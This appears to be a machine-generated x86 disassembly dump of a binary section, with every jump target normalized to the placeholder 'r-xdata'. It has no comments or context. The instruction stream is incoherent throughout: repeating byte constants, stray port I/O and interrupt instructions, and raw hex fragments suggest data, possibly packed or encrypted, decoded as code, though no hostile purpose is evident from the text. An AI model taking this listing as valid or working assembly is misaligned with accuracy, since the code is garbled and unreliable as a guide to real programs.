jae r-xdata
loopne r-xdata
jae r-xdata
xchg ebp eax
mov bl 0x1c
xchg ebp eax
xlat
sbb al 0x96
pop es
or bl [ ebx + 0x73e3e3f9 ]
jae r-xdata
or bh [ edx ]
push ebx
pop edi
jecxz r-xdata
jae r-xdata
retn
or ch [ eax + 0x7373e3e3 ]
jae r-xdata
jae r-xdata
and esp ebx
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
mov ebp 0x661c1c0e
and ebp esp
out 0xe3 al
jecxz r-xdata

mov al [ 0xffffffffe3672462 ]
or esi [ esi - 0xd ]
int1
jecxz r-xdata
sub ch ah
test [ edx - 0x4a ] ebp
jae r-xdata
push 0x6a85b93a
jae r-xdata
lea eax [ ebp - 0x46424996 ]
mov [ edi - 0x1c39eff6 ] eax
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mul [ edx - 0x1c3a17f6 ]
jecxz r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
mov dh 0x3f
or ebx [ edx ]
0xa66ee3e3 0xa1c
sahf
jae r-xdata
sbb [ ebp - 0x5a954b12 ] bl
iretd
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ebx 0x6a859189
sbb al 0x96
test [ edx - 0x62 ] ebp
jecxz r-xdata
or cl ah
adc al 0x1c
sbb al 0x73
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ebx 0x390a8289
jecxz r-xdata
jae r-xdata
int3
push 0x68f3c7af
xor al 0xb
jbe r-xdata
adc eax 0xe3cb6dec
jecxz r-xdata
cmp eax 0x1c3d6fec
sub al [ ebp + 0x7320eb6a ]
jae r-xdata
or dl [ eax ]
jecxz r-xdata
sbb al 0x1c
shl [ ebx ] 0x1
mov esp 0x7320b8bd
jae r-xdata
fdivr [ 0x1c3d6fec ]
and bp sp
xlat
jae r-xdata
mov ecx 0x5be6a85
jae r-xdata
push 0xffffffa5
push ds
sbb al 0x1c
or esi esi
jmp ebx
mov ebx 0x1ba66a85
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
sbb [ esi + 0x66 ] ebp
aaa
mov edi 0x89b98a89
push 0xffffffb6
jae r-xdata
xchg ecx ebp
jae r-xdata
jae r-xdata
jae r-xdata
push 0x9e6a8519
pop ecx
mov [ esi - 0x61957a44 ] edx
or al bl
sti
jecxz r-xdata
mov eax [ eax - 0x32 ]
add ah bh
mov ah 0xa
shl [ ecx ] 0x1
jae r-xdata
sbb al 0x73
cmpsb [ esi ] [ edi ]
push ebx
or bl dl
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
mov edx 0x66ec2366
add dh ah
cmp [ esi - 0x349213eb ] dh
jecxz r-xdata
jecxz r-xdata
xor [ ecx - 0x41957a6c ] ecx
cmp [ esp + ebx ] ebx
jae r-xdata
outsd
jecxz r-xdata
jae r-xdata
sbb [ ecx - 0x61957a65 ] ecx
jecxz r-xdata
mov esp 0x5f9e6a85
push 0xe3e3235b
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
mov ah 0x6a
pop ebx
jae r-xdata
jecxz r-xdata
mov esp [ edx - 0x68 ]
faddp st0
mov ah 0x6a
movsd [ edi ] [ esi ]
lahf
or eax ecx
in eax 0xe3
jae r-xdata
jecxz r-xdata
sbb al 0xb4
mov bl 0xbc
mov ebp 0x7373202a
jae r-xdata
pop ebx
jae r-xdata
mov [ ebp + eax * 4 - 0x7af84196 ] edx
push 0xffffffb6
jae r-xdata
mov edx 0x51be6a85
jae r-xdata
jae r-xdata
jecxz r-xdata
in al dx
add dh ah
out dx eax
push 0x470aeba6
shl bl 0xe3
xchg esi eax
or al [ edi - 0x40 ]
jecxz r-xdata
mov esp edi
loop r-xdata
xchg esi eax
jecxz r-xdata
jae r-xdata
sbb bl [ esp + ebx ]
add ebx esi
retn 0xb4d5
shl ebx 0xe3
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb al 0x6e
jae r-xdata
or [ esp + ebx ] bl
or cl cl
adc al 0x3b
and [ ebx + 0x73 ] dh
in al dx
jae r-xdata
sbb al 0x60
scasd [ edi ]
mov bl 0x1c
je r-xdata
cmp esp [ eax ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov [ 0xffffffffe3d3e38b ] eax
mov dh 0xbd
mov bh [ ecx + 0x6a858d89 ]
jae r-xdata
and bp sp
jae r-xdata
jae r-xdata
pop es
test [ edx - 0x42 ] ebp
test [ edx - 0x52 ] ebp
push 0xffffffbe
jae r-xdata
jae r-xdata
jecxz r-xdata
mov bl 0xb
or [ si ] bl
jecxz r-xdata
jecxz r-xdata
pop ebx
and eax 0x970a8a89
aas
sbb al 0x1c
outsb
aaa
test [ edx - 0x52 ] ebp
jae r-xdata
jae r-xdata
scasb [ edi ]
push edi
outsb
cmpsb [ esi ] [ edi ]
or [ ebx + 0x6a858a89 ] edi
cmpsb [ esi ] [ edi ]
btc [ ecx - 0x59957a6b ] ecx
or eax 0xe3e0d80a
jecxz r-xdata
and al 0xa6
xrstor [ eax + 0x270aaeb5 ]
cmp al 0x1c
sbb al 0x85
push 0xffffffa6
or edi [ ebx + 0x6a859189 ]
dec ebx
cmp ebx [ esp + ebx ]
or eax 0xa1c1c06
jae r-xdata
sbb ebx [ esp + ebx ]
jecxz r-xdata

mov ah 0xaf
jae r-xdata
sar [ eax ] 0x1
mov ah 0x66
mov [ edx - 0x1c1cc6f6 ] eax
push edi
mov esp 0x559e6a85
mov [ esi - 0x61957a44 ] ebp
push 0x859b8919
push 0xffffff9e
mov ecx 0x100a8789
mov [ ebp - 0x4249957b ] ecx
jae r-xdata
in al dx
jae r-xdata
pop edi
test [ edx - 0x62 ] ebp
jae r-xdata
push ecx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
daa
out dx eax
outsb
nop [ esp + ebx ] bx
mov bl 0xa
cmp bl [ ebx ]
sbb al 0x1c
jecxz r-xdata
daa
out dx eax
mov ch 0xb
insd
leave
jecxz r-xdata
or esp [ edi + 0x8 ]
sbb al 0x1c
pushad
lss esi [ eax - 0x4be32f4c ]
and bp sp
daa
out 0xe3 al
jecxz r-xdata
inc bx
push ds
sbb al 0x1c
mov bl 0xb0
sbb al 0xb4
scasd [ edi ]
pop ebp
scasb [ edi ]
jae r-xdata
or edi esi
jae r-xdata
jae r-xdata
sbb al 0x1c
or cl [ ebx + 0x3b ]
sbb al 0x1c
jae r-xdata
cmp eax 0xd01c1c1c
and edi [ ebp + edi * 4 + 0x737320b8 ]
cmpsd [ esi ] [ edi ]
or ah [ ebp + 0xb ]
sbb al 0x1c
outsb
sbb al 0x1c
mov ebp 0xa8789b9
adc dh al
jecxz r-xdata
test [ edx - 0x4a ] ebp
ror [ ebx ] cl
shl ebp cl
jecxz r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
nop
jae r-xdata
sahf
jecxz r-xdata
push esp
jmp r-xdata
mov ah 0x89
loope r-xdata
push 0xb4b0b20f
rcr [ esp + esi * 4 ] 0x1
jae r-xdata
mov ecx esp
or ah [ ebx + 0x731c1c3c ]
jae r-xdata
mov edx 0x6a859789
scasb [ edi ]
jae r-xdata
jae r-xdata
or ax 0x1c06
sbb al 0xa
insd
sbb al 0x74
pavgw mm4 mm3
push edx
add bl [ esp + ebx ]
jae r-xdata
or ecx [ edi + 0xa1c1c08 ]
leave
mov bl 0xb4
sbb al 0x1c
jae r-xdata
xchg edx eax
in al dx
jecxz r-xdata
push esp
rol [ ebp - 0x2f5ea9a ] 0x1
loopne r-xdata
and esi [ ebx - 0x51911e77 ]
inc edi
jae r-xdata
idiv [ ecx ]
jae r-xdata
and [ edx + 0x6a859689 ] edi
xchg edi eax
jae r-xdata
jae r-xdata
push 0xffffffa6
pop es
or ch [ 0x6e1c1c39 ]
jae r-xdata
jecxz r-xdata
or ah cl
std
jecxz r-xdata
inc cl
jecxz r-xdata
sbb al 0x1c
jae r-xdata
shl ebx 0xe3
and cx [ edx ]
cmp ebp esp
jecxz r-xdata
sbb al 0xb5
or [ edx ] 0xffffff8f
mov al 0xa
lodsb [ esi ]
loopne r-xdata
cmp edi [ edx + 0x51be6a85 ]
jae r-xdata
mov [ 0xffffffff89b323d0 ] eax
loope r-xdata
test [ edx - 0x52 ] ebp
sub ebp [ eax + 0x2b ]
shl [ ebx ] 0x1
test [ edx - 0x42 ] ebp
push ebp
test [ edx - 0x5a ] ebp
xor eax edx
cmp [ esi - 0x5a ] ch
aaa
test [ edx - 0x6a ] ebp
sub eax 0x85eb9668
push 0xffffffbe
pop ebx
push 0x20ab339
push es
sbb al 0x1c
jae r-xdata
jae r-xdata
and bp sp
adc [ bp + di ] 0x1c
sbb al 0x6e
pushad
daa
cmpsb [ esi ] [ edi ]
inc edi
or ebp ecx
in al dx
jecxz r-xdata
test [ edx - 0x42 ] ebp
jae r-xdata
push ds
sbb al 0x1c
pop ds
mov dl 0xa
scasb [ edi ]
jecxz r-xdata
jae r-xdata
out dx eax
mov ebx esi
outsb
cmpsb [ esi ] [ edi ]
aas
mov al 0xa
loope r-xdata
test [ edx - 0x4a ] ebp
cmp ecx [ edx ]
jecxz r-xdata
jae r-xdata
mov esi 0xae6a8551
jae r-xdata
jecxz r-xdata
jae r-xdata
or dl [ edx + 0x73e3e3ec ]
jae r-xdata
push 0xffffffae
in al dx
jae r-xdata
fld [ 0x73731c1c ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
mov al 0x85
jae r-xdata
cmc
jecxz r-xdata
shl [ ebx ] 0x1
jecxz r-xdata
jae r-xdata
jae r-xdata
mov al [ 0xffffffffe064e768 ]
cmpsb [ esi ] [ edi ]
inc ecx
push 0xffffffae
jae r-xdata
jecxz r-xdata
in al dx
pop ebx
loop r-xdata
rol [ esi ] 0x1
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
and esp [ ebx + 0x1c02670a ]
jae r-xdata
scasb [ edi ]
daa
push 0xbe6a853c
push ebx
push 0x6a85ba3b
mov [ edi + 0x21ae6a85 ] edx
mov edx 0x6a859689
jae r-xdata
jae r-xdata
cmp eax 0xd0e3e3f2
pop es
push 0x1b2207a6
cld
dec ebx
loop r-xdata
scasb [ edi ]
outsb
xchg di ax
sbb [ esp + ebx ] bl
or ch ah
in eax 0xe3
jecxz r-xdata
or bh [ edi ]

mov [ ebp + eax * 4 - 0x45f65196 ] eax
mov [ edx + 0xfae6a85 ] ecx
or al [ edi - 0x131c1c06 ]
rol [ 0x1c1c ] 0x1
jae r-xdata
outsb
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
and ecx [ ecx - 0x39ecf565 ]
jecxz r-xdata
jae r-xdata
or ah [ edi + 0x2 ]
jae r-xdata
test [ edx - 0x52 ] ebp
in al dx
sbb al 0x89
or cl [ edi + 0x1f ]
test [ ebx - 0x1e ] ebx
cmp eax 0xd0e3e3f2
jae r-xdata
mov [ ebx - 0x1c39ecf6 ] ebx
jecxz r-xdata
jmp r-xdata
push 0x54ec1fa6
sbb al 0xec
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
scasb [ edi ]
cmp [ edx + 0x6a85cd89 ] edi
scasb [ edi ]
aas
mov edx 0x3dae6a85
push 0xa66a852b
pushad
pop es
shl [ ebx ] 0x1
scasb [ edi ]
cmp eax 0x6a852b68
cmpsb [ esi ] [ edi ]
out 0xa0 eax
push 0xa6e064e7
cmpsb [ esi ] [ edi ]
pop ds
in al dx
push esp
push ds
jae r-xdata
jae r-xdata
add bl [ esp + ebx ]
jae r-xdata
sbb ebx [ edx + ecx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
daa
out dx eax
ficomp [ edi + 0x67ecc3c7 ]
jecxz r-xdata
push 0xffffffa6
push esp
cmp al 0x35
jae r-xdata
jae r-xdata
jecxz r-xdata
adc [ 0x73731c1c ] ecx
sbb ebx [ esp + esi * 4 ]
xchg [ eax + 0x1b ] esp
sbb al 0xa
jecxz r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jecxz r-xdata
test [ edx - 0x52 ] ebp
xor eax 0x858289ba
push 0xffffffae
cmp edi [ edx + 0x6a858489 ]
jae r-xdata
or dl [ ecx ]
or eax 0x73731c1c
jae r-xdata
jae r-xdata
lahf
outsb
jae r-xdata
out 0x8b eax
mov al 0x1c
mov ch 0xf7
mov ah 0x1c
jne r-xdata
jae r-xdata
mov esp ebx
shl ebx cl
jecxz r-xdata
xor eax 0xe7891c1c
mov al 0xb5
test edx ebx
jmp r-xdata
jecxz r-xdata
sub bl bh
or bl bl
push 0xffffffa7
mov ebx 0x67ec2366
test al 0xf7
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
push eax
or bl [ esp + ebx ]
jecxz r-xdata
ja r-xdata
push 0x18e40a0f
sbb al 0x1c
push 0xae6a852b
or edi [ edx + 0x6a858489 ]
scasb [ edi ]
or [ edx + 0x6a858a89 ] edi
scasb [ edi ]
mov [ 0x1c02670a ] eax
jae r-xdata
jecxz r-xdata
jae r-xdata
pop es
jae r-xdata
sbb al 0x73
mov ah 0xa
cwde
jmp r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
adc ecx [ ecx + 0xa206891 ]
fdivr st2
jecxz r-xdata
mov [ esi - 0x59957a48 ] eax
push 0xa66a1ba6
jecxz r-xdata
jae r-xdata
or ch [ edx + 0x731c1c0d ]
mov al [ 0xffffffff901cb3fd ]
mov ebx 0xbb42568
mov esi 0x60e3e3fb
outsb
in al dx
jae r-xdata
jae r-xdata
push 0x87b41c1b
pushad
push 0xefa368e2
push 0xe368efa3
push 0xfba368e3
push 0xffffffe7
mov esi 0xba3b6853
jecxz r-xdata
add bl [ si ]
jae r-xdata
push 0x5e
aaa
push ds
sbb al 0x1c
and cx [ edx ]
loope r-xdata
jae r-xdata
or ebp [ eax - 0x5a ]
pop ss
push 0xffffffa6
sbb ebp [ edx - 0x5a ]
and esp [ ebx + 0x6a85202a ]
xor [ eax ] bl
adc eax 0x3c682d68
jae r-xdata
test [ eax + 0xa ] 0x77
out 0xe3 eax
jecxz r-xdata
sbb al 0x1c
sbb al 0x96
pop ds
or dl [ edx + edi * 8 - 0x1d ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sahf
shl [ ebx ] 0x1
mov [ 0x6a85202a ] eax
jecxz r-xdata
mov edx 0xe3cba40b
jecxz r-xdata
sbb al 0x1c
mov edi esp
cmp al 0x35
jae r-xdata
push 0xee00a0f
sbb al 0x1c
jae r-xdata
mov al 0xb3
or esp ecx
or [ esp + ebx ] ebx
pushad
daa
out dx eax
mov al 0xa
or [ eax ] 0x6a731c1c
cmpsd [ esi ] [ edi ]
pushad
lahf
mov edi 0x6a67ece3

sbb al 0x1c
jae r-xdata
or dl [ edi + 0x731c1c18 ]
jae r-xdata
pushad
sub eax 0x18303c68
jae r-xdata
and al bl
jecxz r-xdata
mov ebx 0x85b88689
or [ ebx + 0x6a858489 ] edi
cmpsb [ esi ] [ edi ]
btc [ ecx - 0x59957a7a ] ecx
or eax 0xc1c00abb
jecxz r-xdata
xchg esi eax
jae r-xdata
jmp r-xdata
sbb al 0x1c
jae r-xdata
or dl [ ebx ]
add [ esp + ebx ] bl
jae r-xdata
jae r-xdata
sbb esp [ esi + 0x1c ]
test [ edx ] 0x1c1c1897
jae r-xdata
out 0xc7 eax
mov edx 0x73737320
jae r-xdata
daa
pushad
sbb al 0x1c
jae r-xdata
sbb esp edx
in al dx
sub bl bh
and [ ebx + 0x73 ] dh
mov ch 0x85
sti
jae r-xdata
mov ebx esi
or cl [ edi + 0x1f ]
or edx [ eax + 0xa ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
sbb [ esp + ebx ] bl
jae r-xdata
mov [ 0xffffffffc7e76afb ] eax
push 0x20bac7e7
push ebp
loop r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
or edi [ ebx + 0x6a858289 ]
cmpsb [ esi ] [ edi ]
scasb [ edi ]
add ecx [ edx ]
call 0x742a1e79
sbb al 0x96
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
xor [ ecx + 0xa0d0a86 ] ecx
cmc
jecxz r-xdata
in al dx
in al dx
jae r-xdata
jecxz r-xdata
jae r-xdata
xchg edi eax
jae r-xdata
rcl [ 0x3c682d68 ] 0x1
jae r-xdata
push es
sbb al 0x1c
jae r-xdata
or bh bl
or bl [ eax + 0x73e3e3eb ]
jae r-xdata
cli
jecxz r-xdata
jae r-xdata
pop edx
shl ebx cl
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb4
mov bl 0xa
adc eax [ eax ]
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jecxz r-xdata
push 0xffffff9e
pop ds
mov esp 0x6a85a189
sahf
push ebx
mov esp 0x519e6a85
outsb
jae r-xdata
jae r-xdata
jae r-xdata
or cl [ ebx + edi + 0x1c ]
sbb al 0x73
mov ah 0xb4
mov ebx eax
or bh [ ebx ]
cmp [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
sbb al 0x1c
test edx ebx
xlat
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
push 0x303c682d
sbb [ eax + 0x25 ] ah
jmp r-xdata
jae r-xdata
inc ebp
cmp esp [ esi + 0x38 ]
in al dx
adc [ di ] dh
cmpsb [ esi ] [ edi ]
pop es
jae r-xdata
xchg [ eax - 0x1e ] ebp
push 0xa368efa3
out dx eax
push 0x68e368e3
sbb al 0x1c
shr [ edx ] 0x1
fisubr [ esi + 0x2e65ecef ]
and edi [ ebp + 0x737320b8 ]
jae r-xdata
jae r-xdata
jecxz r-xdata
mov dl 0xa
sbb edx [ esp + ebx ]
sbb al 0x73
jae r-xdata
sbb al 0x75
imul esp ebx 0xffffffe3
in al dx
jl r-xdata
fcmovbe st7
mov ebx 0x73e3e3f9
jae r-xdata
sbb al 0xba
mov edx 0xb23bae6e
mov [ ebx + 0x6ab3951c ] esp
in al dx
jae r-xdata
dec esp
cmp ebx [ esp + ebx ]
jae r-xdata
mov ah 0xb3
jae r-xdata
jae r-xdata
jecxz r-xdata
fsubrp st2
jecxz r-xdata
inc [ esi ]
sbb al 0x1c
jae r-xdata
shl [ ebx ] 0x1
jae r-xdata
jae r-xdata
mul ebx
jecxz r-xdata
and eax 0xbf6ba1eb
push 0x6018303c
in al dx
fistp [ esi ]
or edi edi
jae r-xdata
mov eax 0x73737320
jae r-xdata
sbb al 0x96
adc ecx [ edx ]
xchg [ edx ] cl
jae r-xdata
or al dh
pop ss
sbb eax 0xb31c1c1f
jae r-xdata
jae r-xdata
mov bh 0xea
jecxz r-xdata
sbb al 0x1c
pushad
or al 0x1c
jae r-xdata
or dh al
sbb [ esp + ebx ] bl
jae r-xdata
mov ah 0x89
retn
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or cl [ ebx + 0x60e3e3c6 ]
cmpsb [ esi ] [ edi ]
pop ds

jae r-xdata
jae r-xdata
mov ebp 0x737320b8
jae r-xdata
push 0x36450a13
cmp eax 0x1c03b70a
test al 0xab
mov dl 0x68
test al 0xbb
or ecx [ edx ]
out dx eax
jecxz r-xdata
sbb al 0x1c
[ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
or eax 0x731c1c0a
jae r-xdata
or al [ esi + 0x731c1c10 ]
jae r-xdata
inc bx
sbb al 0xb4
mov bl 0xb0
sbb al 0x74
dec edi
in al dx
and [ ebx + 0x73 ] dh
jae r-xdata
in al dx
push 0x68b2b20f
scasb [ edi ]
jmp r-xdata
or dh [ edi + 0x73e3e3ea ]
jae r-xdata
push esp
jae r-xdata
jae r-xdata
mov [ esi + 0x1c0a0d0a ] eax
jae r-xdata
or ah [ ebx + 0xa ]
jae r-xdata
jae r-xdata
jae r-xdata
mov esi 0xf7460a3b
jecxz r-xdata
sbb al 0x1c
mov edx 0x3bae6eba
mov dl 0x89
jae r-xdata
sbb al 0xb3
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jne r-xdata
jecxz r-xdata
mov [ 0x6ab3951c ] eax
jecxz r-xdata
and esp ecx
sbb al 0x60
in al dx
jae r-xdata
retn
xchg esi eax
push ds
inc ebx
jae r-xdata
mov dh 0x3f
or ebp [ ecx + 0xae3e3e1 ]
inc edi
cmp al 0x1c
sbb al 0x73
jae r-xdata
pushad
and ah cl
pushad
and ecx esp
test [ esi + 0x23 ] esp
in al dx
test eax 0xec1c1c37
push esp
loope r-xdata
and ah cl
pushad
jae r-xdata
xchg esi eax
push 0xffffffa6
sbb ebx [ esp + esi * 4 ]
mov bh 0x66
and ebp esp
or cl [ 0x731c1c0a ]
jae r-xdata
jecxz r-xdata
xchg edi eax
jae r-xdata
or bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
in al dx
or al 0x1c
jae r-xdata
jae r-xdata
push 0xffffffa6
jecxz r-xdata
xchg [ esp + esi * 4 ] ebx
jmp r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
cld
jmp 0x73ba2107
jae r-xdata
jae r-xdata
mov cl 0x34
sbb al 0x1c
loope r-xdata
jae r-xdata
or bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
mov bl 0xb
jae r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffffae
jae r-xdata
push 0x9b0a1ba6
jae r-xdata
push 0x630ab20f
lea ebp [ eax + 0x39 ]
test [ edx - 0x42 ] ebp
loope r-xdata
jae r-xdata
sbb al 0xb3
mov bl 0x1c
mov ah 0xb3
mov al 0x1c
je r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x97
jae r-xdata
and ebp [ esi - 0x47 ]
xor esp [ eax + 0x18 ]
0x1c0b1d0a 0x731c
or eax 0xd01c1c04
sub bl dl
scasb [ edi ]
out dx eax
in al dx
lea eax [ 0x140a1c1c ]
sbb [ esp + ebx ] bl
sbb al 0x73
outsb
scasb [ edi ]
cmp esi [ edx - 0x6ae35c77 ]
mov bl 0x6a
and bl ah
jecxz r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
mov al 0xb5
mov ah 0x68
adc ebx [ edi - 0x1e ]
jecxz r-xdata
jae r-xdata
jae r-xdata
or ah bl
xor eax 0x73731c1c
jae r-xdata
push cs
sbb ecx [ edx ]
jae r-xdata
xchg [ eax ] dl
sbb al 0x1c
jae r-xdata
test [ edx - 0x42 ] ebp
jae r-xdata
in al dx
push esp
shl [ eax + 0x22 ] cl
loope r-xdata
in ax 0xe3
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
mov ebx esp
mov ch 0xb
rol [ esi ] cl
sbb al 0x1c
jae r-xdata
jae r-xdata
loop r-xdata
jae r-xdata
mov bl 0xa
fadd st0
jecxz r-xdata
or bl [ edx + 0x12 ]
jecxz r-xdata
sbb al 0xb5
fild [ eax - 0x5a ]
jae r-xdata
mov ebp ebx
loope r-xdata
loop r-xdata
jae r-xdata
fwait
jae r-xdata
jae r-xdata
jae r-xdata
or bl ah
jae r-xdata
test [ edx - 0x42 ] ebp
mov [ ebp + 0x6a853968 ] ecx
mov esi 0x6a85b8e1
mov esi 0xb8d589e7
xchg esi eax
shr [ edx ] 0x1
jae r-xdata
jno r-xdata
test [ edx - 0x42 ] ebp
sbb al 0x1c
mov dh 0x68
lss ecx [ edx ]
arpl [ edx ] cx
or bh bl
jae r-xdata
jae r-xdata
jae r-xdata
mov esi 0x3b470ae5
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov dh 0x68
sbb eax 0x1c1ed50a
sbb al 0x73
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
in al dx
sbb ebx eax
and al 0xa
retn 0xe3c0
into
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
shl bl 0xe3
shl [ ebx ] 0x1
and [ ebx + 0x73 ] dh
jae r-xdata
pushad
sbb ebx [ esp + ebp * 8 ]
jae r-xdata
adc bl [ esp + ebx ]
sbb al 0x1c
jae r-xdata
in eax 0xa
push 0xffffffbe
jae r-xdata
pop ds
sbb al 0x1c
jae r-xdata
jae r-xdata
pushad
jae r-xdata
sbb al 0x1c
or al [ edi + 0x3b ]
jae r-xdata
jae r-xdata
sbb al 0x1c
mov dh 0x68
lss esi [ edx - 0x4f145198 ]
or bh dh
jae r-xdata
jae r-xdata
or edx [ ecx ]
adc [ si ] ebx
sbb al 0x73
jae r-xdata
out 0x89 eax
push 0xffffffbe
jmp r-xdata
push 0x164a0b25
jae r-xdata
shl [ ebx ] 0x1
jae r-xdata
mov esp ebx
jae r-xdata
jae r-xdata
and bp sp
jae r-xdata
jae r-xdata
xor ebp [ esi + 0x66 ]
arpl [ esi ] bx
sbb al 0x1c
mov al 0xb3
cmpsb [ esi ] [ edi ]
jecxz r-xdata
and ecx [ edx ]
sub al 0xff
jae r-xdata
jae r-xdata
mov bl 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
paddd mm4 mm3
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jbe r-xdata
sbb al 0xec
pop ss
sbb al 0x96
pop ds
sbb al 0x96
pop es
sbb al 0xb4
dec [ ebx - 0x1c1c9c1d ]
mov al 0xa
sbb al 0x96
or ch [ ecx + edi ]
sbb al 0x1c
push 0x1ed50a1d
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
cmp ebx [ esp + ebx ]
and bp sp
jae r-xdata
or eax 0x8b731c1c
jae r-xdata
add eax 0x73731c1c
aaa
sbb al 0x1c
push 0x110beba6
jae r-xdata
sbb al 0x1c
pushad
or ecx [ edx + 0x16 ]
jae r-xdata
mov edx 0x66ec2366
pop ebp
sbb [ esp + ebx ] bl
jae r-xdata
or ch [ edi + edi * 8 ]
push 0xffffffa6
jae r-xdata
mov al 0xa
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ebx 0xb3e3e3e2
jae r-xdata
jae r-xdata
in al dx
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
mov ch 0x87
scasb [ edi ]
jae r-xdata
jae r-xdata
punpckldq mmx1 [ edi ]
jae r-xdata
inc edi
jae r-xdata
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
outsb
mov ecx 0xea186033
or bl [ 0x731c1c0b ]
jae r-xdata
jae r-xdata
or ecx [ ebp + 0xa1c1c05 ]
adc al 0x18
sbb al 0x1c
jae r-xdata
pop cx
in eax dx
sbb al 0x60
jecxz r-xdata
sbb al 0x73
adc ebx eax
jae r-xdata
jecxz r-xdata
jae r-xdata
xor bh bh
jecxz r-xdata
jecxz r-xdata
jae r-xdata
shl dh 0x1
jecxz r-xdata
test [ eax - 0x25 ] esp
jecxz r-xdata
mov ch 0x68
adc ebp esp
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
and [ esp + ebx ] edi
sbb al 0x68
lodsd [ esi ]

sbb al 0x1c
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
insd
loopne r-xdata
popad
adc [ esp + ebx ] bl
mov ebx esp
sbb al 0x75
dec edi
and ebp esp
jae r-xdata
jae r-xdata
jecxz r-xdata
adc [ edx ] cl
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ch 0xa
dec ebx
pop ss
sbb al 0x1c
jae r-xdata
mov al 0x36
sbb al 0x1c
or ch [ ecx ]
loope r-xdata
pop ds
pushad
sahf
pop ds
loopne r-xdata
or al 0x1c
push 0xed67ec13
mov [ ebp + 0x600a1b68 ] edx
sbb [ esp + ebx ] ebx
pushad
jae r-xdata
jecxz r-xdata
or bl bl
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
pushad
fninit
jecxz r-xdata
or ah cl
sbb al 0x1c
mov bh 0xea
bound ecx [ edi ]
xor [ esp + ebx ] bl
or cl dh
jae r-xdata
mov ch 0xdf
sbb al 0x73
aad 0xb8
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb dh [ ebx ]
sbb al 0x73
jae r-xdata
and [ si ] edi
sbb al 0x1c
push 0xa668cbad
aaa
and ebp esp
or dh [ ecx + 0x3b ]
or edi [ ebx - 0x4c1c1c1e ]
0xecd21a60 0x4266
sbb al 0x68
jae r-xdata
push 0xffffffa6
pop ss
mov [ edi - 0x57f5da98 ] edi
jecxz r-xdata
and eax 0xe3f7a80a
jae r-xdata
and ch [ edx ]
and [ ebx + 0x73 ] dh
jae r-xdata
push 0xa6d81fa6
mov edx 0xa323d0ba
or al [ edi + 0x73e3e3f4 ]
jae r-xdata
jecxz r-xdata
jae r-xdata
or eax [ 0x73731c1c ]
or dh [ ebx - 0x12 ]
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
out dx al
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or ah [ edi + 0x11 ]
sbb al 0x1c
jae r-xdata
in eax dx
jae r-xdata
dec ebp
shl [ ebx ] 0x1
